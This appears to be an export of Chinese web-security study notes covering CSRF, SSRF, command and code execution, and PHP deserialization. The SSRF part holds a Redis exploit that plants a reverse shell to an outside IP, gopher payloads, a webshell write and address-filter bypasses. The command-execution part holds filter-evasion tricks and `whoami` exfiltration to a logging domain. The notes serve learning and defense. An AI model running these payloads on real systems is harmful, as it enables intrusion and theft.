构造的网页文件名称包含它的域名 构造的网页文件所在目录名包含域名 申请一个带着它服务器域名的子域名 在恶意请求后添加一个带服务器域名的参数，例如：http://demo.com/csrf.html?targetservername high ' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?> high级别的csrf它增加了token的检查机制。用户访问密码修改页面时，服务器会返回一个随机的token，当用户向服务器提交请求时需要将token的值附上。服务器在接收到请求后会先检查token，如果用户token和存放在服务器的值不一样，就会拒绝执行。 要绕过high级别的token检查机制，就要获得受害用户页面的token 一般获取受害用户token的方法是通过javascript，代码如下： function attack(){ var token = document.getElementById(\"get_token\").contentWindow.document.getElementsByName('user_token')[0].value document.getElementsByName('user_token')[0].value=token; alert(token); document.getElementById(\"csrf\").submit(); } 这里通过一个看不见的iframe来访问密码修改的页面，并获取页面的token 但是这就会产生一个跨域的问题，在浏览器中不同域下的页面不能访问另一个域的内容。所以一般是通过xss漏洞来获取用户的token，然后再发送修改密码的请求，这里懒，就不演示了。 impossible prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data->execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update database with new password $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data->execute(); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match or current password incorrect.\"; } } // Generate Anti-CSRF token generateSessionToken(); ?> impossible级别的防护机制就更加严了，没什么操作空间。它添加了对用户旧密码的检查，除非是制作钓鱼网页，诱导用户输入密码，不然没啥搞头 最后贴一个介绍绕过csrf的trick的pdf:neat-tricks-to-bypass-csrfprotection REFERENCE https://tech.meituan.com/2018/10/11/fe-security-csrf.html http://deepnote.me/2020/04/26/csrf/ https://www.cnblogs.com/zhengna/p/12736823.html Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-06-24 19:51:44 "},"web常见漏洞原理及利用/SSRF漏洞.html":{"url":"web常见漏洞原理及利用/SSRF漏洞.html","title":"SSRF漏洞","keywords":"","body":"SSRF漏洞 简介 SSRF(Server-Side Request Forgery)就是服务端请求伪造，它是一种由攻击者构造而从服务端发起请求的一个漏洞。攻击者在未能获得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在的内网。SSRF工具通常针对的是外部网络无法直接访问的内部系统。 漏洞成因 该漏洞形程的原因是服务端用于请求资源的地址参数可以被用户所控制并且它没有对目标地址进行过滤，例如：服务端使用指定的url来从服务器中获取资源。这会导致攻击者可以构造从服务端发起的请求。一般情况下SSRF攻击目标是内网，攻击者可以扫描内网主机，内网主机开放的端口等信息。同时SSRF漏洞可以结合伪协议来读取服务端文件内容。 漏洞的危害 SSRF会造成的危害： 攻击者可以扫描内网开放的服务信息 攻击者可以向内网主机发送payload来攻击内网服务 利用file 、gopher、dict协议读取本地文件、执行命令 攻击者可以发送payload给服务端，使其请求大文件，造成DOS攻击 常见的场景 SSRF可能出现的场景： 通过url地址分享的文章 社交分享功能：获取超链接的标题等内容进行显示 图片的加载和下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 开发平台接口测试工具：一些公司会把自己的一些接口开放出来，形成第三方接口。这个时候他们通常会开发一个用于测试自己接口是否连通的web，给这些程序员测试接口，如果没有过滤好，就会造成ssrf 相关函数 这里只介绍在PHP中出现的和SSRF相关的函数，主要的有这三个： file_get_contents() file_get_contents()函数用于将文件读入一个字符串，它的函数原型如下： file_get_contents( string $filename, bool $use_include_path = false, resource $context = ?, int $offset = 0, int $length = ? ): string|false 其中filename是要读取的文件的名称，这个可以是url，如果url中具有特殊字符例如空格，那么就需要进行url编码 use_include_path用于触发搜索include_path，在include_path指定的目录列表下获取文件 context是由stream_context_create()函数创建的有效的context资源 offset是读取原始数据流的开始位置的偏移 length是要读取数据的最大长度 fsockopen() fsockopen()函数用于打开一个网络连接或者一个Unix套接字连接，它的函数原型如下： fsockopen( string $hostname, int $port = -1, int &$errno = ?, string &$errstr = ?, float $timeout = ini_get(\"default_socket_timeout\") ): resource 其中hostname是要连接的主机，port是端口号，errstr是错误信息字符串，timeout是连接超时时间。fsockopen()函数会返回一个文件句柄，可以被文件类函数调用。 curl_exec() curl_exec()函数用于执行cURL 会话,这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。函数原型如下： curl_exec(resource $ch): mixed 其中ch是由curl_init()函数返回的cURL句柄 这三个函数使用不当就会造成SSRF漏洞 利用方法 一个简单的SSRF的demo: 读取本地文件 可以通过PHP中的file协议来读取本地文件，file协议的作用是访问本地文件系统 file://协议的利用条件： allow_url_fopen:off/on allow_url_include :off/on 用法： http://192.168.31.54/ssrf.php?url=file:///etc/passwd 探测内网存活主机及服务 这里可以利用dict协议和 http/https协议来探测内网存活主机及服务 先获取目标主机的网络配置信息，通过读取读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件来获取，从而获得目标主机的内网网段并进行爆破。 http://192.168.31.54/ssrf.php?url=file:///etc/hosts 域网IP地址范围分三类，以下IP段为内网IP段： C类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255 探测内网主机是否存活payload http://192.168.31.54/ssrf.php?url=http://192.168.31.1 这里可以通过burpsuite的Intruder模块来进行爆破 payload的设置 最后通过返回响应的长度判断主机是否存活 当然，使用tubor intruder插件来爆破会更快，这里演示下用法，安装了tubor intruder后，单击右键选择将请求发送给tubor intruder tubor intruder通过%s替代要被爆破的参数，它会有基本示例脚本供参考 其中concurrentConnections 参数代表和服务器建立多少条连接，requestsPerConnection 参数代表每条连接同时发送多少个请求 engine.queue() 函数用于向队列中插入请求，这里的target.req是请求的模板，而str(i)就是%s要爆破的内容 探测内网主机服务 通过dict协议来探测主机服务 payload: http://192.168.31.54/ssrf.php?url=dict://192.168.31.54:80 //http http://192.168.31.54/ssrf.php?url=dict://192.168.31.54:22 //ssh http://192.168.31.54/ssrf.php?url=dict://192.168.31.54:6379 //redis 爆破的话可以写脚本也可以通过burpsuite 攻击内网服务 gopher协议基本使用 gopher协议简介 Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。 Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这极大拓宽了 SSRF 的攻击面。 gopher协议格式 URL:gopher://:/_后接TCP数据流 其中_相当于一个连接符，可以设置为任意字符，不包括在为请求数据内 gopher使用限制 PHP版本>=5.3 并且编译时带有--wite-curlwrappers JAVA JDK Curl 低版本不支持，太高版本好像也不支持 Perl 支持 ASP.NET 利用gopher发送GET请求 这里使用curl来发送请求，通过curl --version来查看版本及其支持的协议 root@ubuntu18:~# curl --version curl 7.58.0 (x86_64-pc-linux-gnu) libcurl/7.58.0 OpenSSL/1.1.1 zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 (+libidn2/2.0.4) nghttp2/1.30.0 librtmp/2.3 Release-Date: 2018-01-24 Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP HTTP2 UnixSockets HTTPS-proxy PSL gopher协议发送数据的格式： 换行回车必须使用%0d%0a替代，不能但用%0a表示，如果存在多个参数，参数间的&也要进行URL编码 数据都需要进行URL编码 在进行URL编码时，?需要转码为%3f 发送的HTTP包数据末尾要加上%0d%0a，表示消息结束 服务端代码： 构造一个GET型的HTTP包： GET /test.php?name=test HTTP/1.1 Host: 192.168.31.54:8088 URL编码如下所示: GET%20/test.php%3fname=test%20HTTP/1.1%0d%0aHost:%20192.168.31.237:8088%0d%0a 发送请求: curl gopher://192.168.31.54:8088/_GET%20/test.php%3fname=test%20HTTP/1.1%0d%0aHost:%20192.168.31.237:8088%0d%0a 请求结果： 发送POST请求 服务端代码： 构造一个POST请求包： POST /test.php HTTP/1.1 Host: 192.168.31.54:8088 Content-Type:application/x-www-form-urlencoded Content-Length:11 name=test 进行URL编码： POST%20/test.php%20HTTP/1.1%0d%0aHost:%20192.168.31.54:8088%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=test%0d%0a 发送请求： curl gopher://192.168.31.54:8088/_POST%20/test.php%20HTTP/1.1%0d%0aHost:%20192.168.31.54:8088%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=test%0d%0a 请求结果： 攻击redis服务 Redis时一个开源的key-value型存储系统，通常被称为数据结构服务器。 通过gopher协议攻击内网Redis服务，如果内网中的Redis存在未授权访问漏洞，并且Redis服务以root权限运行时，可以利用gopher协议来攻击，通过写入定时任务来实现反弹shell，或者是写入一个webshell。 攻击redis的exp: echo -e \"\\n\\n\\n*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1\\n\\n\\n\"|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit 通过socat捕获发送的数据 socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379 这会将本地的4444端口转发到redis服务的6379端口，访问4444端口就相当于访问服务器的6379端口 这里用docker来搭建redis的环境会遇到点小问题，执行exp.sh时它会返回找不到/var/spool/cron路径 root@823a5abb3710:/home# bash exp.sh 127.0.0.1 4444 OK (error) ERR Changing directory: No such file or directory OK OK OK 网上搜了一圈，没发现解决方法，最后发现是没有安装cron导致的，使用apt安装cron就解决了 exp.sh发送的数据 > 2021/07/12 08:59:52.654090 length=88 from=0 to=87 *3\\r $3\\r set\\r $1\\r 1\\r $61\\r */1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1 \\r 2021/07/12 08:59:52.659635 length=57 from=0 to=56 *4\\r $6\\r config\\r $3\\r set\\r $3\\r dir\\r $16\\r /var/spool/cron/\\r 2021/07/12 08:59:52.664951 length=52 from=0 to=51 *4\\r $6\\r config\\r $3\\r set\\r $10\\r dbfilename\\r $4\\r root\\r 2021/07/12 08:59:52.670266 length=14 from=0 to=13 *1\\r $4\\r save\\r 2021/07/12 08:59:52.684576 length=14 from=0 to=13 *1\\r $4\\r quit\\r 将捕获的数据转为适合的格式： 如果第一个字符是>或者那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a 空白行替换为%0a 抄来的转化脚本： #coding: utf-8 #author: JoyChou import sys exp = '' with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '> 最后转换结果为： *3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 结合gopher协议发起攻击请求 curl -v 'http://192.168.31.54:8088/ssrf.php?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a' 然后，我就踩坑了，ubuntu下我反弹不回来一个shell，真的要命。 ubuntu对crontab的格式要求比较严格，这里写入crontab文件的内容如下： REDIS0006þ󿾁= */1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1 ÿ¯ 这里由于格式问题，所以不能加入crontab的任务队列中 这里还有另一个坑点是执行 crontab 使用的是 /bin/sh , 而ubuntu下/bin/sh 软连接的是dash ，而不是 bash，那么如果直接在 cron 里面写 bash - i xx 的反弹是不可能成功的。。。。所以环境不要用ubuntu，用centos！ 具体参考这篇文章：redis getshell实战 反弹shell搞不了那就写个webshell意思意思 写入webshell的前提： 知道web目录的绝对路径 当前运行redis的用户在web目录有写权限 exp: redis-cli -h $1 -p $2 config set dir /var/www/html/ redis-cli -h $1 -p $2 config set dbfilename shell.php redis-cli -h $1 -p $2 set shell \"\\\\n\\\\n\" redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit 捕获的有效数据： *4\\r $6\\r config\\r $3\\r set\\r $3\\r dir\\r $14\\r /var/www/html/\\r *4\\r $6\\r config\\r $3\\r set\\r $10\\r dbfilename\\r $9\\r shell.php\\r *3\\r $3\\r set\\r $3\\r cmd\\r $32\\r \\\\n\\\\n\\r *1\\r $4\\r save\\r *1\\r $4\\r quit\\r 转换后的payload: gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0acmd%0d%0a$32%0d%0a\\\\n\\\\n%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 通过SSRF漏洞访问这一URL，最后可以发现webshell成功写入 绕过方法 存在SSRF漏洞的功能可能会做白名单或者黑名单处理，用来阻止对内网服务及资源的访问。因此想要成功的进行SSRF攻击，需要对请求的参数地址做相关绕过的处理，这里记录一下常见的绕过方式 限制了请求域名 当它限制了请求的地址为http://www.demo.com时，可以采用HTTP基本身份认证的方式绕过，如： http://www.demo.com@www.evil.com 它会将@后面的当作域名 限制请求IP不为内网地址 可以采用短网址绕过 可以采用指向任意域名的xip.io来绕过 例如： 127.0.0.1.xip.io可以解析为127.0.0.1 利用进制转换绕过,127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433 其他各种指向127.0.0.1的地址 http://localhost/ # localhost就是代指127.0.0.1 http://0/ # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1 http://0.0.0.0/ # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址 http://[0:0:0:0:0:ffff:127.0.0.1]/ # 在liunx下可用，window测试了下不行 http://[::]:80/ # 在liunx下可用，window测试了下不行 http://127。0。0。1/ # 用中文句号绕过 http://①②⑦.⓪.⓪.① http://127.1/ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1 限制请求协议为http 这个可以采用302跳转，百度短地址，或者使用https://tinyurl.com生成302跳转地址 最后贴一个github项目Server-Side Request Forgery, 里面有各种bypass的payload REFERENCE https://www.cnblogs.com/zzjdbk/p/12970519.html https://www.cnblogs.com/linuxsec/articles/12684293.html https://cloud.tencent.com/developer/article/1610645 https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/ https://www.136.la/jingpin/show-172851.html https://www.yuque.com/pmiaowu/web_security_1/cs5l14#i3wZS https://joychou.org/web/phpssrf.html Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-07-13 11:08:05 "},"web常见漏洞原理及利用/命令执行&代码执行漏洞.html":{"url":"web常见漏洞原理及利用/命令执行&代码执行漏洞.html","title":"命令执行&代码执行漏洞","keywords":"","body":"命令执行&代码执行漏洞 代码执行漏洞原理 代码执行漏洞是由于web应用过滤不严谨，导致用户可以通过请求将代码注入到web应用中进行执行。php中有一些函数可以将参数当作代码来执行，例如assert()、call_user_func()等。当开发者使用了这些函数时，但没有对参数进行严格限制，导致了用户可以控制这些函数的参数，执行任意代码，这就是代码执行漏洞。 常见危险函数 php代码执行相关的函数 eval() mixed eval(string $code) $code是需要被执行的字符串，这个字符串必须以;结尾。同时代码不能包含PHP tags，例如：\"\"这样的字符串是不行的。 eval()不是一个函数，它是一个语言构造器，所以不可以被可变函数调用。 assert() bool assert(mixed $assertion [, string $description]) assert()函数是PHP中用来判断一个表达式是否成立的函数，返回值是true or false 。 如果传入的assertion是字符串的话，那它会被assert()当作php代码来执行。 assert()函数传入的php代码不需要;来作为结尾 preg_replace() preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed preg_replace()函数用来执行一个正则表达式的搜索和替换，搜索subject中匹配pattern的部分，然后用replacement进行替换。 当$pattern参数中存在/e修饰符时，$replacement会被当作php代码来执行。 PHP5.5.0版本起，/e修饰符已经被弃用了，使用preg_replace_callback()代替，如果传入/e修饰符，会产生一个E_DEPRECATED错误，但是$replacement还是会被当作代码执行。 PHP7.0版本起，会产生E_WARNING错误，同时/e修饰符无法生效。 call_user_func() mixed call_user_func(callable $callback[, mixed $parameter[, mixed $..]]) 第一个参数callback时 被调用的回调函数，其余参数是回调函数的参数。 array_map 用法： array array_map(callable $callback, array $array1[, array $...]) array_map为数组的每个元素应用回调函数。callback函数形参的数量要和传给array_map()数组数量一致。 call_user_func_array mixed call_user_func_array ( callable $callback , array $param_arr ) 第一个参数是回调函数，第二个参数是回调函数的参数数组 create_function create_function用于创建一个匿名函数，它内部实现用到了eval。 用法： create_function ( string $args , string $code ) : string 第一个参数args是后面定义函数的参数，第二个参数$code是函数代码 PHP动态函数 因为PHP特性的原因，PHP的函数名可以由字符串来进行拼接 例如： 或者： $_GET['a']($_POST['b']); 利用这样的写法可以进行各种变形，通常被当作web后门使用 Curly Syntax PHP中的Curly Syntax也能导致代码执行，它将执行花括号间的代码，并且将结果替换回去。 demo: 命令执行漏洞原理 命令执行漏洞是指可以执行系统或者应用命令(cmd命令或者bash命令)的漏洞，主要是由于web应用使用了一些能执行命令的函数，但是对它们的参数过滤不严谨导致。 常见危险函数 system system(string $command[, int &$return_var]): string system函数会执行command参数所指定的命令，并且输出执行结果。 exec exec ( string $command [, array &$output [, int &$return_var ]] ) : string exec()会执行command指定的命令 shell_exec() shell_exec ( string $cmd ) : string shell_exec()会通过shell环境执行命令，并且将完整的输出以字符串的方式返回。 执行操作符``就是通过shell_exec()实现的。 passthru passthru ( string $command [, int &$return_var ] ) : void 与exec()函数类似，执行外部程序并且显示原始输出 pcntl_exec pcntl_exec ( string $path [, array $args [, array $envs ]] ) : void pcntl是php的多进程处理扩展，在处理大量任务的情况下会使用到，需要额外安装。 $path是可执行程序的路径，$args是传递给$path程序的参数。 例如： pcntl_exec(\"/bin/bash\",array(\"whoami\")); popen popen ( string $command , string $mode ) : resource popen()函数打开一个指向进程的管道，该进程由派生给定的command命令执行产生 例如： popen(\"whoami >> test.php\",\"r\"); proc_open proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd = NULL [, array $env = NULL [, array $other_options = NULL ]]] ) : resource 与popen()类似，执行一个命令，并且打开用来输入输出的文件指针，提供了比popen()更加强大的控制程序执行的能力。 ob_start ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) : bool 这个 函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。 内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外，使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。 可选参数callback如果被指定，那么当输出缓冲区被送出或者清洗时，或者请求结束之际，该函数将会被调用。 当该函数调用时，输出缓冲区的内容会被当作参数去执行，并返回一个新的输出缓冲区作为结果，并且送到浏览器中去。 例子： 常见绕过姿势 命令操作符 cmd1 | cmd2 (|管道操作符) 管道操作符会将cmd1的结果输出给cmd2 cmd1 & cmd2 (&和号操作符) &会让命令在后台运行 cmd1 ; cmd2 (; 分号操作符) 执行多条命令 cmd1 && cmd2 (&&与操作符) 只有cmd1执行成功后才会去执行cmd2 cmd1 || cmd2 (|| 或操作符) cmd1执行失败才会执行cmd2 空格过滤绕过 字符串拼接 IFS(内部域分隔)是SHELL内置变量，是一个用于分隔的字符列表，默认值是空白(空格、tab、换行) 用法： root@DESKTOP-10M601S:/home# cat${IFS}flag flag{just_simple_flag} root@DESKTOP-10M601S:/home# cat$IFS'flag' flag{just_simple_flag} root@DESKTOP-10M601S:/home# cat$IFS\"flag\" flag{just_simple_flag} root@DESKTOP-10M601S:/home# cat$IFS$1flag flag{just_simple_flag} 使用{} 例如： root@DESKTOP-10M601S:/home# {cat,flag} flag{just_simple_flag} 使用tab 例如： ?id=cat%09/etc/passwd 使用重定向符 在读取文件时可以使用重定向符来替代空格 例如： root@DESKTOP-10M601S:/home# cat<>flag flag{just_simple_flag} root@DESKTOP-10M601S:/home# cat 黑名单关键字绕过 字符串拼接 a=c;b=at;c=fl;d=ag;$a$b ${c}${d} root@DESKTOP-10M601S:/home# a=c;b=at;c=fl;d=ag;$a$b ${c}${d} flag{just_simple_flag} 利用环境变量 linux下有一些环境变量，可以通过这些分割这些变量来拼接出想要的字符串 root@DESKTOP-10M601S:/home# echo ${SHELLOPTS} braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor root@DESKTOP-10M601S:/home# echo ${SHELLOPTS:3:1} c root@DESKTOP-10M601S:/home# echo ${SHELLOPTS:2:1} a root@DESKTOP-10M601S:/home# ${SHELLOPTS:3:1}at${IFS}flag flag{just_simple_flag} 利用空变量 root@DESKTOP-10M601S:/home# cat fl${x}ag flag{just_simple_flag} 利用linux通配符?* root@DESKTOP-10M601S:/home# /bin/ca? fl?? flag{just_simple_flag} 利用反斜杠 \\反斜杠在bash中被解释为转义字符，用于去除单个字符的特殊意义。它保留了跟随在之后的字符的字面值(除了换行符)。 root@DESKTOP-10M601S:/home# ca\\t f\\lag flag{just_simple_flag} 利用bash64编码 root@DESKTOP-10M601S:/home# echo t | base64 dAo= root@DESKTOP-10M601S:/home# ca$(echo \"dAo=\" | base64 -d) flag flag{just_simple_flag} root@DESKTOP-10M601S:/home# echo flag | base64 ZmxhZwo= root@DESKTOP-10M601S:/home# cat $(echo \"ZmxhZwo=\" |base64 -d) flag{just_simple_flag} 无回显情况 命令执行可能会存在没有回显的情况。这时要判断命令是执行，有三种方法。 延时 通过sleep命令来进行延时 例子： 访问： http://localhost/demo.php?a=sleep 3 HTTP请求 首先要有一台公网可通信的机子，目标通过向这个机子发起http请求，当该机子收到http请求时，说明命令执行成功。 如果没有一台公网机子的话，可以去ceye注册一个账号。 注册了以后他会分配一个3级域名给你，通过向这个域名发起http请求可以将命令执行的数据带出 例子： root@DESKTOP-10M601S:/home# curl http://vlut7q.ceye.io/`whoami` {\"meta\": {\"code\": 201, \"message\": \"HTTP Record Insert Success\"}} 一般使用http请求带出的数据最好经过base64编码一下。 root@DESKTOP-10M601S:/home# curl http://vlut7q.ceye.io/`whoami|base64` 使用DNS通道带出 如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。 这里用的同样是ceye ，通过ping命令来发起dns请求 root@DESKTOP-10M601S:/home# ping `whoami`.vlut7q.ceye.io 代码执行和命令执行漏洞防御 对相应的函数设置参数的白名单，结合正则表达式来进行白名单限制 对参数进行严格过滤 最简单的方法就是不允许命令执行 REFERENCE https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/ https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/ https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-05-25 15:48:00 "},"web常见漏洞原理及利用/PHP反序列化漏洞.html":{"url":"web常见漏洞原理及利用/PHP反序列化漏洞.html","title":"PHP反序列化漏洞","keywords":"","body":"PHP反序列化漏洞 PHP序列化 PHP使用serialize()函数来进行序列化 函数原型： serialize ( mixed $value ) : string serialize()函数返回一个字符串，这个字符串包含了表示value的字节流，可以存储与任何地方，通常会存储在一个文本文件中。 序列化有利于存储或者传递PHP的值，同时不会丢失其类型和结构。 序列化对象 PHP中的对象可以被序列化，如果对象存在魔法函数__sleep()，那么在序列化前会调用魔法函数__sleep()，__sleep()函数必须返回一个数组，数组的内容是要进行序列化的属性。 demo1: \".$this->name.\"\"; echo \"\"; } public function __sleep(){ return array('var','name'); } } $var = new test() $var->name = 'admin'; $s = serialize($var); echo \"\".$s.\"\"; ?> 输出结果： O:4:\"test\":2:{s:3:\"var\";i:1;s:4:\"name\";s:5:\"admin\";} 对象序列化结果的格式： O:4:\"test\":2:{s:3:\"var\";i:1;s:4:\"name\";s:5:\"admin\";} 对象类型:长度:对象名:类中变量的个数:{类型:长度:值:类型:长度:值.....} 对象类型的缩写集合： a - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string 上面demo中的类的属性仅有publics属性，而php中类的属性的权限一共有三种：public(公有的)、protected(受保护的)、private(私有的)。 三者的区别： 被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问 。 demo2: \".$this->name.\"\"; echo \"\"; } } $a = new test(); $a->var = 1; $a->name = 'admin'; $b = serialize($a); echo \"\".$b.\"\"; ?> 输出结果： 可以发现potected属性名称前会加一个*，它的属性名长度为6，是因为protect属性序列化的时候格式是%00*%00成员名，%00占一个字节，所以长度为6 。private属性序列化的时候格式是%00类名%00成员名，所以长度为14 。 常见类型的序列化： demo3: \"; echo serialize($str); echo \"\"; echo serialize($dou); echo \"\"; echo serialize($boole); echo \"\"; echo serialize($null); echo \"\"; echo serialize($arr); echo \"\"; ?> 输出结果： i:1; s:7:\"strings\"; d:0.10000000000000001; b:1; N; a:2:{i:0;s:1:\"1\";i:1;s:1:\"2\";} PHP反序列化 PHP反序列化使用 unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 函数原型： unserialize ( string $str ) : mixed 如果反序列化后的对象存在__wakeup()方法，那么在反序列化成功后，php会自动的去调用__wakeup()方法。 PHP魔术方法 PHP将所有以两个下划线为开头的类方法保留为魔术方法。 常见的魔术方法： __sleep() __wakeup() __construct() __destruct() __call() __callStatic() __toString() __invoke() __get() __set() __isset() __unset() __sleep() __sleep()方法在对象被序列化前调用，会返回一个数组，其中包含者要被序列化的属性。它通常用于提交未提交的数据或者类似的清理操作。 函数原型： public __sleep ( void ) : array __wakeup() unserialize()函数会检查反序列化的对象是否存在一个__wakeup()方法，如果存在，反序列化成功后会自动的去调用这个方法。这个方法通常用于初始化操作，如重新建立数据库链接。 函数原型： __wakeup ( void ) : void __construct() __construct()方法是类的构造函数，每次创建新对象时都会调用这个方法。 函数原型： __construct ([ mixed $args [, $... ]] ) : void __destruct() __destruct()方法是类的析构函数，析构函数会在某个对象的所有引用被删除或者当对象被显示销毁时执行，通常是脚本结束时执行。 函数原型： __destruct ( void ) : void __call() 当对象调用了一个不可访问的方法时，__call()就会被调用。 函数原型： public __call ( string $name , array $arguments ) : mixed 其中$name是要调用的方法的名称，$arguments是要传给调用方法的参数 __callStatic() 从PHP5.3开始出现此方法, 当在静态上下文中调用一个不可访问方法时，__callStatic()方法会被调用。 函数原型： public static __callStatic ( string $name , array $arguments ) : mixed __toString() 当对象被echo输出时，会调用__toString()方法。这个方法必须返回一个字符串。 __invoke() 当尝试以调用函数的方式来调用一个对象时，__invoke()方法会被调用。 函数原型： __invoke ([ $... ] ) : mixed __get() 